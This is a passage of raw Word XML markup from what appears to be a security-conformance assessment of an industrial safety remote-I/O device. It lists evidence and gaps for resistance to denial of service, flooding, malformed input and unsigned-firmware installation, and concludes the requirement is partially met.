                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:hyperlink r:id="rId248" w:history="1">
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="33DB4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14D3A5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EMC Criterion B/DS (safe state under disturbance)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85C46" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>SRIO-11572/11574/11987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8C285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t>Documented</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> "</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>withstand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disturbance</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> → safe </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>state</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">" </w:t>
            </w:r>
            <w:hyperlink r:id="rId249" w:history="1">
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[100_SRIO_P...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="638C8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AAC24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>PROFINET Net Load Class III certification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AD1EC" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>SRIO-1787/1915/1916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4137D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 xml:space="preserve">Certified robustness to high </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>conformant</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> network load</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> — tempers the "no flood protection" claim </w:t>
            </w:r>
            <w:hyperlink r:id="rId250" w:history="1">
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>[100_SRIO_P...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00D73D4E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AC6357" w:rsidRPr="00AC6357" w14:paraId="06042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C7C39" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>CC-C, IRT non-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>disturbance</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t xml:space="preserve">, port </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>deactivation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65C3D" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>SRIO-3025/3027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D7F94" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">Stack-level </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>robustness</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId251" w:history="1">
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="386B33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8C741" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">2-connection HTTP </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>cap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0F1E3" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t>SRIO-7909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C732C" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">COM/IoT </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>resource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cap</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> (also </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>the</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> RQ-007 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>self-DoS</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">) </w:t>
            </w:r>
            <w:hyperlink r:id="rId252" w:history="1">
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00AC6357">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00AC6357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03A0D1A4" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Gaps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B97296A" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-1 (flooding/malformed-input — accurate, tempered).</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Net Load Class III (SRIO-1916) certifies robustness to high </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>conformant</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> load, but </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no protection against malformed frames or application-layer floods</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> on the IoT/DCP path is documented → verify by fuzzing/flood test. </w:t>
      </w:r>
      <w:hyperlink r:id="rId253" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[100_SRIO_P...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="011CA120" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w:rsidRDefault="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-2 (repeated-passivation-as-DoS — your best point, retained).</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Even if every attack resolves </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>safely</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to passivation, </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>continuous forced passivation = continuous unavailability of the safety function</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → the device satisfies the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fail-safe</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> interpretation but may fail the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>availability</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> interpretation of "withstand" (a permanently-safe-stated machine may itself be an operational hazard).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="425E0564" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-3 (the one genuine "leads-to-hazard" path — cross-referenced, decisive).</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Almost all</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> foreseeable attacks resolve to the safe state (black channel + watchdog + CR 3.6) </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>except</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unsigned-firmware install (RQ-005 G-2 / TC-RQ005-03)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, which installs attacker-controlled safety firmware → </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>can</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> lead to a hazardous situation. RQ-010 is </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>met for the communication/DoS/fuzzing classes</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> but </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not for the firmware-integrity class</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the single, precise exception. </w:t>
      </w:r>
      <w:hyperlink r:id="rId254" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2C01B315" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>SL/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>conformance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conclusion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> RQ-010 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>is</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>substantially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met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by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design</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>for</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>communication-layer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>malicious</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>attempts</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>black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channel</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> + dual-SCPU + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>watchdog</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> + CR 3.6 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>deterministic</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> safe </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>output</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>ensure</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>DoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>spoofing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>tampering</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>fuzzing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>resolve</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>to</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>the</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>defined</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> safe </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>state</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> (Net Load Class III </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>certifies</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>conformant-load</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>robustness</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve">). </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Two </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>residuals:</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>repeated-passivation availability</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (G-2 — safe but potentially operationally hazardous), and (ii) the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unsigned-firmware path</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (G-3 — the one class that can genuinely lead to hazard; </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>tested in RQ-005, authorized in RQ-011</w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">). Net: </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>partially met; the firmware-integrity exception is the decisive shortfall.</w:t>
      </w:r>
    </w:p>
